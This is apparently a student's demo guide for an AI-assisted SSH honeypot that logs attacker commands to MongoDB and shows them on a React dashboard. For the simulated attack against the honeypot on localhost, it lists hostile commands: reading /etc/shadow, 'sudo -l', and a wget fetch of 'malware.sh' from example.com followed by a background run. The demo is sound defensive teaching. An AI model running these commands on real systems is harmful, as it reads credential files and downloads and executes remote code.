# 🎓 Faculty Demo Guide — AI Honeypot Threat Intelligence System

> **Use this guide to run and demonstrate the project step by step in front of your faculty.**

---

## 📌 Project Overview (Explain This First)

This is a **Full-Stack, AI-powered SSH Honeypot** — a cybersecurity tool that:
- **Simulates a real Linux server** to attract hackers
- **Logs every command** an attacker types directly into **MongoDB**
- **Classifies attacker skill level** (Beginner / Intermediate / Advanced)
- **Assigns risk scores** to each action
- **Tracks attacker location** via GeoIP mapping
- **Displays everything on a real-time dashboard**

### Three Main Components

| # | Component | File/Service | Port | Purpose |
|---|-----------|--------------|------|---------|
| 1 | **Database Server** | MongoDB | 27017 | Stores all logs, commands, and session replays |
| 2 | **Honeypot Server** | `main.py` | 2222 | Fake SSH server that traps attackers |
| 3 | **API Server** | `api_server.py` | 5000 | Flask backend serving live data from MongoDB |
| 4 | **React Dashboard** | `dashboard/` | 5173 | Real-time threat visualization |

### Tech Stack
- **Database** — MongoDB (pymongo)
- **Backend (Python)** — Paramiko (SSH), Flask (API), GeoIP2 (Location)
- **Frontend (React)** — Vite, TailwindCSS, Recharts, React-Leaflet
- **Architecture** — MERN-inspired full-stack with live data pipeline

---

## 🛠️ PRE-DEMO SETUP (Do This Before Faculty Arrives)

### Step 1: Ensure MongoDB is Running
Make sure the **MongoDB Server** is running on your machine.
- **Windows Services**: Press `Win + R`, type `services.msc`, find "MongoDB Server", and ensure its Status is **Running**.
- Or via terminal: run `mongod`.

### Step 2: Open the Project Folder
```powershell
cd c:\Users\vishn\OneDrive\Desktop\devHH\Honeypot
```

### Step 3: Install Dependencies (if not already done)
```powershell
# Python Backend
pip install paramiko flask flask-cors geoip2 pymongo

# React Frontend
cd c:\Users\vishn\OneDrive\Desktop\devHH\Honeypot\dashboard
npm install
```

---

## 🚀 LIVE DEMO — Step-by-Step

> **You need 4 terminal windows open. Open them all side by side first.**

---

### 🟢 TERMINAL 1 — Start the Honeypot Server

```powershell
cd c:\Users\vishn\OneDrive\Desktop\devHH\Honeypot
python main.py
```

**🎤 Say to Faculty:**
> "This starts our SSH honeypot on port 2222. It pretends to be a real Ubuntu production server. Any attacker who connects will think they're inside a real machine."

---

### 🟢 TERMINAL 2 — Start the API Server

```powershell
cd c:\Users\vishn\OneDrive\Desktop\devHH\Honeypot
python api_server.py
```

**🎤 Say to Faculty:**
> "This is our Flask API server. It connects to MongoDB, reads the honeypot logs in real-time, and serves them as REST APIs for the dashboard."

---

### 🟢 TERMINAL 3 — Start the React Dashboard

```powershell
cd c:\Users\vishn\OneDrive\Desktop\devHH\Honeypot\dashboard
npm run dev
```

**🎤 Say to Faculty:**
> "This is our React frontend dashboard. It fetches data from our API and visualizes threat intelligence in real time."

### 🌐 Open the Dashboard in Browser
Open **http://localhost:5173** in your browser.

---

### 🟢 TERMINAL 4 — Simulate an Attack (Live Demo!)

> **This is the most impressive part. You will SSH into your own honeypot as a fake attacker.**

```powershell
ssh -p 2222 admin@localhost
```

- When asked about host key fingerprint → Type **`yes`** and press Enter
- When asked for password → Type **any password** (e.g., `password123`) and press Enter

**✅ You should now see a fake Ubuntu shell prompt:**
```bash
admin@prod-db-01:~$
```

**🎤 Say to Faculty:**
> "I'm now connected to the honeypot as an attacker. Let's run some commands to test the system's behavioral analysis."

---

### 🎭 Run These Commands One by One (Explain Each)

#### Phase 1: Basic Reconnaissance (Low Risk)
```bash
whoami
pwd
ls
```
> "The attacker checks their environment. Our system logs this directly to MongoDB as low-risk recon."

#### Phase 2: System Exploration (Medium Risk)
```bash
cat /etc/passwd
ps aux
```
> "Trying to read the user file or list processes. This is classic attacker behavior. Our system flags this as medium-risk."

#### Phase 3: Malicious Activity (High Risk)
```bash
sudo -l
cat /etc/shadow
wget http://example.com/malware.sh
nohup ./malware &
```
> "The attacker is trying to escalate privileges and download malware! Our AI engine immediately escalates the threat score to Critical."

#### Exit the Honeypot
```bash
exit
```
*(The session data and transcript are now saved in MongoDB for replay.)*

---

### 🖥️ SHOW THE DASHBOARD (Switch to Browser)

Switch to the browser at **http://localhost:5173** and demonstrate:

1. **Dashboard Home (`/`)** — Real-time metrics.
2. **Live Sessions (`/sessions`)** — Show the new session you just created, including skill level and risk classification.
3. **Command Timeline (`/timeline`)** — Show every command logged.
4. **Session Replay (`/replay`)** — Replay the full attack session like a terminal video!
5. **Analytics (`/analytics`)** — Risk distribution and skill levels across all time.
6. **Threat Map (`/threatmap`)** — Interactive world map using GeoIP.

---

## ❓ Common Faculty Questions & Answers

### Q: "Is this a real SSH server?"
> **A:** "Yes, it uses the Paramiko library for the SSH protocol. However, instead of an OS shell, it provides a virtual Python filesystem that returns fake outputs to keep the host safe."

### Q: "How does the AI classify attacker skill?"
> **A:** "The `DeceptionEngine` analyzes command intentions and complexity. Running basic `ls` indicates a low-skill script kiddie. Attempting to hide a process (`nohup ./malware &`) or reading password hashes (`/etc/shadow`) indicates high skill. The engine adapts its delays and responses accordingly."

### Q: "What database does this use?"
> **A:** "We use **MongoDB**, aligning with modern MERN-stack principles. The database structure has three collections: `commands` (individual actions), `sessions` (overall session metadata), and `session_replays` (full transcripts). This allows the API to perform fast aggregations."

### Q: "How is the location tracked?"
> **A:** "We use the MaxMind GeoLite2 database to resolve attacker IPs to GPS coordinates. For local testing (127.0.0.1), the system simulates a real-world location to demonstrate the map capabilities."

---

## 🛑 Stopping Everything After Demo
Press **`Ctrl+C`** in each terminal to stop the servers.
